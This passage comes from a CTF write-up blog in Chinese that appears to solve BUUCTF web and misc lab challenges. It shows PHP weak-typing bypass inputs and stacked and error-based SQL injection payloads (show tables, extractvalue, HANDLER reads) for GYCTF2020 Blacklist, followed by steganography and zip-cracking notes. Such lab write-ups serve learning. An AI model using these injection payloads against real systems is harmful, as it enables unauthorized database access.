class="token operator">!==</span> <span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'You got the first step'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token operator">==</span><span class="token number">1234567</span><span class="token punctuation">)</span>                 <span class="token punctuation">{</span>                     <span class="token keyword">echo</span> <span class="token string">'Good Job!'</span><span class="token punctuation">;</span>                     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'By Retr_0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>                 <span class="token keyword">else</span>                 <span class="token punctuation">{</span>                     <span class="token keyword">echo</span> <span class="token string">"can you think twice??"</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">'You can not get it !'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'only one way to get the flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"You are not a real hacker!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Please input first'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一步绕过：</p><pre><code> if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) </code></pre><p>利用数组绕过：</p><pre><code>?gg[]=1&amp;id[]=2</code></pre><p>第二步绕过：</p><pre><code>if (!is_numeric($passwd))            {                 if($passwd==1234567)</code></pre><p>payload：</p><pre><code>passwd=1234567e</code></pre><p>然后得到flag</p><p>大佬的博客：<a href="https://www.ghtwf01.cn/index.php/archives/777/" target="_blank" rel="noopener">PHP弱类型及相关函数Bypass</a></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>注入题目，先sqlfuzz一下，看响应里面有提示：</p><p>preg_match(“/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i”,$inject);</p><p>另外这个网站有防sqlmap就别想sqlmap了！</p><p>堆叠注入了，跟强网杯的随便注一个模板，同时也过滤了很多</p><p>payload：</p><pre><code>1&#39;;show tables;#</code></pre><p>得到表明：FlagHere</p><pre><code>1&#39;;show columns from FlagHere;#</code></pre><p>得到列名：flag</p><p>利用报错注入得到库名：supersqli</p><pre><code>-1&#39; or extractvalue(1,concat(&#39;~&#39;,database()))#</code></pre><p>新考点学习：<a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">mysql中的HANDLER … OPEN语句</a></p><p>payload：</p><pre><code>1&#39;;use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</code></pre><p>得到flag</p><h1 id="2021-04-29"><a href="#2021-04-29" class="headerlink" title="2021-04-29"></a>2021-04-29</h1><p>蓝帽杯：全国排名123（模糊）北部战区66名，山东20</p><p>解出题目：misc1+web1</p><h1 id="2021-04-30"><a href="#2021-04-30" class="headerlink" title="2021-04-30"></a>2021-04-30</h1><p>进入星盟安全的天汉安全团队，因为要通过战队考核期故而转战CTFHUB</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf之Misc</title>
      <link href="/2021/01/15/buuctf-zhi-misc/"/>
      <url>/2021/01/15/buuctf-zhi-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33035611&auto=1&height=66"></iframe><h1 id="2021-1-15"><a href="#2021-1-15" class="headerlink" title="2021/1/15"></a>2021/1/15</h1><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>下载得到QR_code.png图片，扫码得到secret is here，但并非flag。</p><p>但是这个图片的大小却是600多个kb，所以怀疑是压缩包文件，改个后缀zip打开发现有密码</p><p>因为文件名字是4number所以爆破得到密码7639，解压得到flag：CTF{vjpw_wnoei}</p><p>改为flag{vjpw_wnoei}提交成功</p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>也是一个改后缀的题，改为txt得到</p><pre><code>data:image/jpg;base64,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</code></pre><p>要是我记得没错应该是base64和图片的转换，得到二维码一张扫一下得：KEY{dca57f966e4e4e31fd5b15417da63269}</p><p>flag{dca57f966e4e4e31fd5b15417da63269}</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>提示：看不到图？ 是不是屏幕太小了 </p><p>意思就是说这个图下面还有一半没显示出来</p><p>用winhex打开</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8815%E6%97%A51825_1.png" alt></p><p>将67改为与23相同的02和A7（修改高度和宽度相同）然后得到flag{He1l0_d4_ba1}</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>tmd，又是一道图片隐写题</p><p>winhex打开看看，直接Ctrl+f就找到了</p><p>flag{stego_is_s0_bor1ing}</p><h1 id="2021-1-16"><a href="#2021-1-16" class="headerlink" title="2021/1/16"></a>2021/1/16</h1><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>提示：给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对= =我说了什么了不得的东西。。 </p><p>一看是四位数的密码，ARAR直接爆破</p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>这个题说来也巧，我刚在u盘里面发现一个没用的图片并且把它删了，结果下一题（这个题）就是我删掉的图片</p><p>winhex直接过</p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><h3 id="关于stegsolve的使用："><a href="#关于stegsolve的使用：" class="headerlink" title="关于stegsolve的使用："></a>关于stegsolve的使用：</h3><p>File Format:文件格式，这里可以看见图片的具体信息有时候有些图片隐写的flag会藏在这里</p><p>Data Extract:数据提取，用于提取RGB数据信息</p><p>Steregram Solve:立体试图 可以左右控制偏移</p><p>Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，把动图一帧帧的放</p><p>Image Combiner:拼图，图片拼接</p><h4 id="关于版块Data-Extract"><a href="#关于版块Data-Extract" class="headerlink" title="关于版块Data Extract"></a>关于版块Data Extract</h4><p>Data Extract:(好多涉及到数据提取的时候，很多博主在wp中都是一带而过，小白们还以为要一个个试。。)</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8817%E6%97%A51639_1.png" alt></p><p> 左边一大部分主要是讲了RGBA（Alpha是透明度）的颜色通道</p><p>为了方便理解我们分开说</p><p>RGB是红绿蓝 但他们的值代表的实际上是亮度</p><p>R的数字越大，则代表红色亮度越高；R的数字越小，则代表红色亮度越低。G，B同理</p><p>R的亮度各有256个级别，GB同理。即从0到255，合计为256个。从数字0到255的逐渐增高，我们人眼观察到的就是亮度越来越大，红色、绿色或蓝色越来越亮。然而256是2的8次方 所以你会看见上图的7~0 一共8个通道</p><p>而Alpha就是透明度 该通道用256级灰度来记录图像中的透明度信息，定义透明、不透明和半透明区域</p><p>alpha的值为0就是全透明，alpha 的值为 255 则表示不透明</p><p>因此左半部分就理解了</p><p>右半部分就是Extra By(额外的)和Bit Order（位顺序）和Bit Plane Order（位平面的顺序）</p><p>1）.Extra By(额外的)：分为row（行）和column（纵）</p><p>  每个像素用R，G，B三个分量表示，那么一张图片就像一个矩阵，矩阵的每个单位就是（0<del>255，0</del>255，0~255）</p><p>  也就会有是纵排列和行排列了，一般事先访问行再访问列（如果相反会引起ve使用方法）</p><p>￼2）.Bit Order（位顺序）:MSB是一串数据的最高位，LSB是一串数据的最低位。</p><p>3）.Bit Plane Order（位平面的顺序)</p><p>   整个图像分解为8个位平面，从LSB(最低有效位0)到MSB（最高有效位7）随着从位平面0 到位平面7，位平面图像的特征逐渐变得复杂，细节不断增加。（一般我们的图片如果是RGB那么就是24位 3乘8嘛）</p><p>4）Bit Plane Order（位平面的顺序）:一般图片是24位 也就是3个8 大家可以想像成三明治 比如BGR就是B为三明治第一层 G为第二层 R为第三层。</p><h3 id="关于此题：LSB"><a href="#关于此题：LSB" class="headerlink" title="关于此题：LSB"></a>关于此题：LSB</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8817%E6%97%A51645_2.png" alt></p><p>save bin格式为png后，会发现这是一样二维码，扫码得到cumtctf{1sb_i4_s0_Ea4y}</p><p>flag{1sb_i4_s0_Ea4y}</p><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>得到一个jpeg后缀的图片</p><p>原来flag藏在文件的属性里面啊</p><h1 id="2021-1-17"><a href="#2021-1-17" class="headerlink" title="2021/1/17"></a>2021/1/17</h1><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>提示：这个是一个rar文件，里面好像隐藏着什么秘密，但是压缩包被加密了，毫无保留的告诉你，rar的密码是4位纯数字。</p><p>爆破就ok</p><p>密码：8795</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>提示：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)</p><p>直接搜索password，找到对应的value就是flag</p><p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>得到一个二维码</p><p>扫码即可flag{878865ce73370a4ce607d21ca01b5e59}</p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>知识点补充：</p><h3 id="来了解一下ZIP文件的组成"><a href="#来了解一下ZIP文件的组成" class="headerlink" title="来了解一下ZIP文件的组成"></a><strong>来了解一下ZIP文件的组成</strong></h3><p>一个 ZIP 文件由三个部分组成：<br>　　压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><h4 id="a-压缩源文件数据区："><a href="#a-压缩源文件数据区：" class="headerlink" title="a.压缩源文件数据区："></a>a.压缩源文件数据区：</h4><p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密，奇数加密，偶数无加密）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500</p><h4 id="b-压缩源文件目录区"><a href="#b-压缩源文件目录区" class="headerlink" title="b.压缩源文件目录区:"></a>b.压缩源文件目录区:</h4><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密，奇数加密，偶数无加密）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</p><h4 id="c-压缩源文件目录结束标志"><a href="#c-压缩源文件目录结束标志" class="headerlink" title="c.压缩源文件目录结束标志:"></a>c.压缩源文件目录结束标志:</h4><p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 1A：ZIP 文件注释长度</p><p>在这个010工具里面他会自动识别并且给你，这里针对我的加粗字体的地方进行修改，基本就是位于14 00后面，保存再次打开就没加密了flag{Adm1N-B2G-kU-SZIP}</p><h1 id="2021-1-18"><a href="#2021-1-18" class="headerlink" title="2021/1/18"></a>2021/1/18</h1><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>foremost跑一下得到</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8820%E6%97%A50026_1.png" alt></p><p>根据题目所说的4位数，我们直接进行爆破得到密码8368的打开文件得到flag{b025fc9ca797a67d2103bfbc407a6d5f}</p><h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>得到图片名字叫steg</p><p>所以用stegsolve打开lsb隐写(在red plane 0处，左上角有无规则点)终结题目</p><p>flag{st3g0_ saurus_wr3cks}</p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>tip：某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？</p><p>直接wireshark查找flag，ctrl+d找到与之对应的分组详情，右键显示分组字节即可flag{da73d88936010da1eeeb36e945ec4b97}</p><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>提示：小明有一个保险箱，里面珍藏了小明的日记本，他记录了什么秘密呢？。。。告诉你，其实保险箱的密码四位纯数字密码。</p><p>得到的图片改为.zip后缀，直接爆破即可7869</p><p>flag{75a3d68bf071ee188c418ea6cf0bb043}</p><h1 id="2021-1-19"><a href="#2021-1-19" class="headerlink" title="2021/1/19"></a>2021/1/19</h1><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>得到文件jpg</p><p>winhex打开发现了里面说有flag.txt</p><p>那么用foremost分离肯定会得到东西</p><pre><code>-V  - 显示版权信息并退出-t  - 指定文件类型.  (-t jpeg,pdf ...) -d  -打开间接块检测 (针对UNIX文件系统) -i  - 指定输入文件 (默认为标准输入) -a  - 写入所有的文件头部, 不执行错误检测(损坏文件) -w  - 向磁盘写入审计文件，不写入任何检测到的文件-o  - 设置输出目录 (默认为为输出)-c  - 设置配置文件 (默认为 foremost.conf)-q  - 启用快速模式. 在512字节边界执行搜索.-Q  - 启用安静模式. 禁用输出消息. -v  - 详细模式. 向屏幕上记录所有消息。</code></pre><p>分离得到zip文件，有密码，在文件属性里面发现this_is_not_password其实这个就是密码，mad还摆我一道</p><p>flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>pcap文件用wireshark打开发现都是tcp文件，而且好像是从偶数开始，每个包都带有data的一点点小数据FLAG:385b87afc8671dee07550290d16a8071</p><p>flag{385b87afc8671dee07550290d16a8071}</p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>用winhex打开在最后发现了二进制编码01101011011011110110010101101011011010100011001101110011</p><p>分割：01101011 01101111 01100101 01101011 01101010 00110011 01110011</p><p>得到koekj3s就是flag</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>提示：请将 hctf 替换为 flag 提交，格式 flag{}</p><p>lsb隐写分离得到文件，改为zip格式，解压得到无后缀文件1，winhex打开得到：</p><p>hctf{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</p><p>flag{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</p><h1 id="2021-1-20"><a href="#2021-1-20" class="headerlink" title="2021/1/20"></a>2021/1/20</h1><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>得到一张路飞的图片</p><p>flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</p><p>flag{377cbadda1eca2f2f73d36277781f00a}</p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>得到一张图片，我怀疑上面是盲文解密</p><p>得到：kmdonowg</p><p>这个一定就是music压缩包的密码，结果打开以后一听，里面是莫斯电码的性质，用到工具audacity得到电码：</p><p>-.-. - ..-. .– .–. . .. —– —.. –… …– ..— ..–.. ..— …– -.. –..</p><p>解码：</p><p>CTFWPEI08732?23DZ</p><p>flag{wpei08732?23dz}</p><h2 id="BJDCTF-2nd-最简单的misc-y1ng"><a href="#BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="[BJDCTF 2nd]最简单的misc-y1ng"></a>[BJDCTF 2nd]最简单的misc-y1ng</h2><p>继续winhex打开<br>发现少了png的文件头。<br>于是添加上去（复制粘贴：塒NG)←89 50 4E 47</p><p>得到完整图片也就是424A447B79316E677A756973687561697D</p><p>BJD{y1ngzuishuai}</p><h2 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h2><p>得到图片使用<code>010 editor</code>打开的时候出现<code>CRC</code>匹配错误</p><p>总结：这种错误意思就是图片的高度被修改过</p><p>改前：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8822%E6%97%A51451_1.png" alt></p><p>改后：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8822%E6%97%A51451_2.png" alt></p><p>然后就会看到flag</p><p>BJD{PnG_He1ghT_1s_WR0ng}</p><p>flag{PnG_He1ghT_1s_WR0ng}</p><p>文件头格式：</p><p>JPEG (jpg)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：FFD8FF</p><p>PNG (png)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：89504E47</p><p>GIF (gif)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：47494638</p><p>ZIP Archive (zip)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：504B0304</p><p>RAR Archive (rar)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：52617221</p><h1 id="2021-1-21"><a href="#2021-1-21" class="headerlink" title="2021/1/21"></a>2021/1/21</h1><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>hint：神秘龙卷风转转转，科学家用四位数字为它命名，但是发现解密后居然是一串外星人代码！！好可怕！</p><p>四位数密码：5463</p><p>得到龙卷风：brainfuck解密</p><p>得flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><h2 id="BJDCTF-2nd-小姐姐-y1ng"><a href="#BJDCTF-2nd-小姐姐-y1ng" class="headerlink" title="[BJDCTF 2nd]小姐姐-y1ng"></a>[BJDCTF 2nd]小姐姐-y1ng</h2><p>WINHEX打开：</p><p>BJD{haokanma_xjj}</p><h2 